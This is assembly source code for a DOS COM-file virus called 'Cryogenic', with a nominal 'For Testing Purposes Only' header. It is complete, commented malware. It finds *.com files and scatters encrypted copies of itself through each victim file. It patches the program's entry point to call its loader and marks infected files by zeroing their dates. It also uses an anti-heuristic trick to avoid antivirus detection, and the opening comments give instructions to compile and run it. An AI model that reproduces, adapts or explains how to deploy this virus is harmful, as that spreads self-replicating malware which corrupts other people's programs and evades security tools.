   ; For Testing Purposes Only

   ; Cryo

   ; Compile this to exe file, run it and you will have one com file
   ; in current directory infected.

   ; Virus Description
   ; Type = Non resident Com Virus
   ; Desc = Uses non standard version of COM file infection.
   ;    Semi-Polymorphic,Crypted,Middle-File,and other stuff
   ; Size = 1389 bytes

   ; Small description - this virus is non-standard. It uses interesting technique
   ; of infecting Com files. This technique could be used in exe virus to.

   ; Step of file infecting
   ; 1. Find victim
   ; 2. Check size
   ; 3. If all ok, randomly gets offset for loader procedure, read's from there
   ;    loader procedure size + table size bytes
   ; 4. Then using loop, randomly gets offset for virus block in victim file.
   ;    If choosed area is free(no another blocks or loader), it read's block
   ;    size to variables, and writes here block. Offset of block in file is
   ;    stored in table (For each block, different entries)
   ; 5. When all blocks written, it writes procedure with newly created table.
   ; 6. Then it reads first 100 bytes and if first byte is JMP NEAR, jumps in
   ;    file to pointing position. Then it begins to semi-emul (calculate opcode
   ;    size) 50 bytes. When limit is reached, or any non-allowed opcode reached
   ;    (for example case,far jump,calls , etc) it returns control back.
   ; 7. At founded location it makes Near Call to Loader Procedure, and writes
   ;    to the end of file old parts of file.

   ; Contains some antiheuristics trick

   Blocks  = 25                ; How many blocks build ?
                       ; Minimum = 1
                       ; Maximum = 200
                       ; (This values is only recommended)

   MinLen  = 5000+Vlen+Blocks*2+Dlen   ; Minimum size of Infecting file
                       ; More blocks - needed bigger file size

   .model tiny
   .286
   .code
       org 0h
   main:
       push ds ds ds           ; Store Ds 3 times

       mov ax,1200h            ; This is anti-heuristics trick
       int 2Fh             ; In Dos i2Fh,Ax=1200h would return 0FFh
       mov cx,VLen         ; in al
       inc al              ; Al = 0
       mov si,offset AllOk
   FFF:    xor byte ptr cs:[si],al     ; Crypt us by zero
       inc si
       loop FFF

       push cs:[zTbl]          ; Store offset of entry procedure
       cmp cs:[zTbl],0         ; If it zero-no restore (1st time exec)
       jz NoRestore            ; This is done for first time run

       mov bp,sp           ; Get offset of our "Call Loader"
       sub word ptr ss:[Bp][12*2+2],3  ; which is created by semi-emul proc.
       mov di,ss:[Bp][12*2+2]

       push ds
       pop  es
       mov si,cs:[Fend]        ; Restore 3 bytes (Call to loader)
       add si,100h         ; Si now points to end of file
       movsb               ; Patch to com file
       movsw

       mov di,cs:[ztbl]        ; Here is our loader procedure
       add di,100h
       mov cx,Ldrl+Blocks*2+Dlen
   rep movsb

       mov bx,offset Tbl       ; Cx = number of blocks
       mov cx,Blocks           ; Bx = our table

   LRest:  push cx             ; Store number of blocks
       mov di,cs:[Bx]          ; Di = block offset in file
       add di,100h         ; Patch to com file
       mov ax,cx           ; Ax = number of blocks
       mov cx,pvlen            ; Cx = one block len
       dec ax              ; Decrease Ax.
       jne CopyIt          ; Zero ?
       add cx,Lvlen            ; Yeap... If it zero, that's last block
                       ; virus isn't padded to block size,
                       ; so last block is bigger than any
                       ; another
   CopyIt:
   rep movsb               ; Copy block
       inc bx              ; Next block entry in table
       inc bx
       pop cx              ; Restore num of blocks
       loop LRest          ; again...

       push cs             ; Es = Cs
       pop  es

       mov di,offset tbl       ; Di = offset to blocks table
       mov cx,Blocks
       xor ax,ax           ; Clean it.
   rep stosw

   NoRestore:

       push cs cs          ; Ds = Es = Cs
       pop  ds es

       mov ah,1ah          ; Setup DTA
       mov dx,offset dta
       int 21h
       mov ah,4eh          ; Findfirst file
       xor cx,cx
       mov dx,offset fmask     ; Dx = File mask
   FFile:  int 21h             ; Go !
       jnc FExist          ; Founded one...
       jmp Quit            ; No files more...
   FExist: cmp [FDate],0           ; Date = 0 ?
       jne Infect          ; If no - infect file
   NFile:  mov ah,4fh          ; Next File...
       jmp FFile           ; Do it
   Infect:
       mov ax,[Flen]           ; Store file end
       mov [Fend],ax           ; in our variables
       cmp ax,MinLen           ; Less then minimum size ?
       jbe NFile

       xor ax,ax           ; Get encrypt value
       Call GetRnd         ; (for crypting blocks)
       mov [DPatch],al         ; Store it

       mov ax,3d02h            ; Open file
       mov dx,offset fname
       int 21h
       xchg ax,bx          ; Handle to Bx

       mov ax,Flen
       sub ax,Ldrl-Blocks*2        ; Get random from 0 to
                       ; FileLen - (LoaderLen + TableLen)
       call getrnd
       add ax,50           ; this made to skip entry call overwrite

       mov [ztbl],ax           ; Store loader offset

       xchg ax,dx          ; Jump to this area

       mov ax,4200h            ; Point..
       xor cx,cx
       int 21h

       mov ah,3fh
       mov dx,offset free+3        ; Lets read what stores there
       mov cx,ldrl+Blocks*2+Dlen   ; Cx - LoaderLen+BlocksLen+DecryptorLen
       int 21h

       mov [Cnt],0         ; Counter = 0
   LetsRock:
       call GetOff         ; Get random offset for block in file
                       ; which is not used.

       mov si,[Cnt]
       shl si,1
       add si,offset Tbl
       mov word ptr cs:[Si],ax     ; Store offset in table

       xchg ax,dx
       mov ax,4200h            ; Point to it
       xor cx,cx
       int 21h

       push ax             ; Store for later use

       mov ax,[Cnt]            ; Calculate where to read old block
       mov cx,pvlen            ; of file
       mul cx
       xchg ax,dx

       cmp [Cnt],Blocks-1      ; Last block ?
       jne NoAdd
       add cx,Lvlen            ; If yes , add to it paricular size
   NoAdd:
       mov ah,3fh
       add dx,offset free+Ldrl+Dlen+Blocks*2+3
                       ; Read old bytes
       int 21h

       pop dx

       mov ax,4200h            ; Back to choosed offset
       xor cx,cx
       int 21h

       mov ax,[Cnt]
       mov dx,pvlen
       mul dx
       xchg ax,si          ; Calculate offset of block to be
                       ; written

       mov di,offset StCrp     ; Di = temp area

       mov cx,pvlen
       cmp [Cnt],Blocks-1      ; Choose size of block
       jne NoAddZ
       add cx,Lvlen
   NoAddZ:
       push cx di
   LCrypt:                 ; Crypt block...
       lodsb
       xor al,[Dpatch]
       stosb
       loop LCrypt

       pop  dx cx
       mov ah,40h          ; Write crypted block
       int 21h

       inc [Cnt]
       cmp [Cnt],Blocks        ; Lets write next block
       jb LetsRock

       mov dx,[zTbl]           ; Get offset of loader
       xor cx,cx
       mov ax,4200h            ; Point to it
       int 21h

       mov si,offset Loader        ; Lets crypt loader with tables
       mov di,offset CrpAr
       mov cx,Ldrl+Blocks*2
       mov dx,[zTbl]           ; Dx = offset in file
       add dx,100h
       Call XMM

       mov ah,40h
       mov dx,offset CrpAr     ; Write crypted
       int 21h

       mov ax,4200h            ; Jump to beginning of file
       xor cx,cx
       cwd
       int 21h

       mov ah,3fh
       mov dx,offset CrpAr     ; Read 50 bytes
       mov cx,50
       int 21h

       cwd
       mov [JmpP],dx           ; Dx=0. Used in relative call offset

       mov si,offset CrpAr     ; If first byte is JMP NEAR ?
       lodsb
       cmp al,0E9h
       jz ItJump
       jmp NotJmp          ; Not jump
   ItJump:
       lodsw
       add ax,3            ; Calculate offset in file

       mov dx,[zTbl]
       cmp dx,Ldrl+Blocks*2+Dlen   ; Check if it points to any block ?
       jb ItLower
       sub dx,Ldrl+Blocks*2+Dlen   ; First - points to loader ?
       jmp Compare1
   ItLower:
       mov dx,53
   Compare1:
       cmp ax,dx           ; Second - check if it points to
       jb OkWithLoader         ; any block
       add dx,(Ldrl+Blocks*2+Dlen)*2
       cmp ax,dx
       jbe Blah
   OkWithLoader:
       mov cx,Blocks
       mov di,offset Tbl
   FindOff:
       mov dx,[Di]
       cmp dx,Pvlen
       jb ItLower2
       sub dx,Pvlen
       jmp Compare2
   ItLower2:
       mov dx,53
   Compare2:
       cmp ax,dx
       jb NormalBlock
       add dx,Pvlen*2
       cmp ax,dx
       jbe Blah
   NormalBlock:
       loop FindOff

       xchg ax,dx
       mov ax,4200h            ; All ok - no blocks there.
       xor cx,cx           ; Point to this area
       int 21h
       mov [JmpP],ax
       mov ah,3fh
       mov dx,offset CrpAr     ; Read 50 bytes
       mov cx,50
       int 21h
       jmp NotJmp          ; Lets trace it
   Blah:
       mov ax,[zTbl]           ; Founded jump to our blocks/loader
       sub ax,3
       mov [JPatch],ax
       mov ax,4200h            ; Simple modify it.
       xor cx,cx
       cwd
       int 21h
       mov ah,3fh
       mov dx,offset free      ; Read first bytes
       mov cx,3
       int 21h
       mov ax,4200h
       xor cx,cx
       cwd
       int 21h
       mov ah,40h
       mov dx,offset JPatch-1      ; Write our jmp
       mov cx,3
       int 21h
       jmp WriteStuff
   NotJmp:
       mov si,offset CrpAr     ; Si - where we loaded data
       mov cx,40
       Call Surf           ; Surf through it !
       push si
       mov di,offset free      ; Store founded bytes
                       ; (Surf finished at it)
       movsw
       movsb
       pop si
       mov ax,si
       sub ax,offset CrpAr
       add ax,[JmpP]
       sub ax,[zTbl]
       add ax,3
       neg ax
       mov [JPatch],ax         ; Encode call
       mov cl,0E8h
       mov ds:[si],cl          ; Patch different values
       mov ds:[si][1],ax
       mov dx,[JmpP]
       mov ax,4200h            ; Back to loaded routine
       xor cx,cx
       int 21h
       mov ah,40h          ; Write changed bytes (with call)
       mov dx,offset CrpAr
       mov cx,50
       int 21h
   WriteStuff:
       mov ax,4202h            ; To the end of file
       xor cx,cx
       cwd
       int 21h

       mov ah,40h          ; Write file stuff
       mov dx,offset free
       mov cx,Vlen+ldrl+Dlen+Blocks*2+3
       int 21h

       mov ax,5701h            ; Set date = 0
       cwd
       int 21h
       mov ah,3eh          ; Close file
       int 21h
   ;   jmp NFile
       jmp Quit
   ;------------------------------------------------

       db  0E9h
   JPatch  dw  ?

   GetOff  proc
       mov ax,Pvlen
       cmp ax,Ldrl+Blocks*2+50+Dlen        ; This sub proc gets random
       ja NegPvlen             ; offset for block
       mov ax,Ldrl+Blocks*2+50+Dlen
   NegPvlen:
       neg ax
       add ax,[FLen]

       call getrnd
       add ax,53

       mov dx,[zTbl]
       sub dx,Ldrl+Blocks*2+50+Dlen        ; Check new offset with
       cmp ax,dx               ; Loader
       jb Okz
       add dx,(Ldrl+Blocks*2+50+Dlen)*2
       cmp ax,dx
       jbe GetOff
   Okz:
       mov si,offset Tbl
       mov cx,Blocks
   CheckOut:
       mov dx,[Si]

       cmp [Cnt],Blocks-1
       jz ItSpec
   ;------------------------------------
       cmp dx,Pvlen+53             ; Check new offset with offsets
       jb NoSub                ; of previous blocks
       sub dx,PVlen
       jmp OkSub
   NoSub:
       mov dx,53
   OkSub:
       cmp ax,dx
       jb ItOk
       add dx,PVlen*2
       cmp ax,dx
       jbe GetOff
       jmp iTOk
   ;-----------------------------------
   ItSpec:
       cmp dx,Pvlen+Lvlen+3+50
       jb NoSub2
       sub Dx,Pvlen+LVlen
       jmp OkSub2
   NoSub2:
       mov dx,53
   OkSub2:
       cmp ax,dx
       jb ItOk
       add dx,(Pvlen+Lvlen)*2
       cmp ax,dx
       jbe GetOff
   ;-----------------------------------
   ItOk:   inc si
       inc si
       loop CheckOut
       ret
   GetOff  endp

       db  '[Cryogenic] by Soulburner from [HAZARD] Team'

   RandSeed    dd  12345678h

   getrnd      proc            ; Get's random value
           push dx
           push di si cx bx    ; Save used registers
           mov  cx,ax      ; save limit
           mov  ax,Word ptr cs:[RandSeed+2]
           mov  bx,Word ptr cs:[RandSeed]
           mov  si,ax      ; Lets make some manipulations
           mov  di,bx      ; with old random value
           mov  dl,ah
           mov  ah,al      ; Exchange it
           mov  al,bh
           mov  bh,bl
           xor  bl,bl
           rcr  dl,1       ; Rotate it
           rcr  ax,1
           rcr  bx,1
           add  bx,di
           adc  ax,si
           add  bx,62e9h   ; Add it
           adc  ax,3619h
                       ; Store new value
           mov  word ptr cs:[RandSeed],bx
           mov  word ptr cs:[RandSeed+2],ax
           xor  dx,dx      ; If we divide by maximum needed
                       ; value , in Dx we would get
                       ; number which in area of 0 <-> Limit
           or cx,cx
           jnz YeapLimit
           mov dx,ax
           jmp NoLimit
   YeapLimit:
           div  cx
   NoLimit:
           pop  bx cx si di
           mov  ax,dx      ; return modulus
           pop dx
           ret
   getrnd      EndP

   fmask       db  '*.com',0

   Quit:   pop ax
       or ax,ax
       jne NoHalt
       mov ah,4ch          ; If we first time executed - just exit
       int 21h
   NoHalt:
       pop es ds
       mov ah,1ah
       mov dx,80h
       int 21h
       pop dx
       mov word ptr cs:[BackTo][2],dx
       popa
       popf
       pop word ptr cs:[BackTo]

       jmp $+2             ; Clear prefetch queue

       db  0EAh
   BackTo  dd  ?

   zTbl    dw  ?           ; Storage for decryptor offset
   Cnt dw  ?
   Fend    dw  ?           ; Storage for file end

   include xmm.inc
   include surf.inc

   Loader:
       call getpp          ; This is loader
   getpp:  pop bp
       sub bp,offset getpp

       mov ax,cs
       add ax,1000h
       mov es,ax

       mov cx,Blocks

       lea bx,[Tbl][Bp]        ; Get offset of block in table,
       xor di,di           ; decrypt and copy it to new memory
       push es di          ; location
   LetsRest:
       push cx
       mov si,word ptr cs:[Bx]
       add si,100h
       mov ax,cx
       mov cx,PVlen
       dec ax
       jne NoAddD
       add cx,Lvlen
   NoAddD:
       lodsb
       db  34h         ; Xor al,ZZ
   DPatch  db  ?
       stosb
       loop NoAddD

       inc bx
       inc bx
       pop  cx
       loop LetsRest
       retf                ; To re-created virus...
   ldrl    equ offset $ - offset Loader

   tbl dw  Blocks dup (?)

   Vlen    equ offset $ - offset main
   pvlen   equ Vlen / Blocks
   lvlen   equ Vlen - Blocks*Pvlen

   JmpP    dw  ?           ; Storage for JMP offset

   dta db  21 dup (?)
       db  ?
       dw  ?
   Fdate   dw  ?
   Flen    dw  ?
       dw  ?
   Fname   db  13 dup (0)

   free    db  Ldrl + Blocks*2 + Vlen + 50 dup (?)

   StCrp   db  Pvlen dup (?)

   CrpAr:

   end main
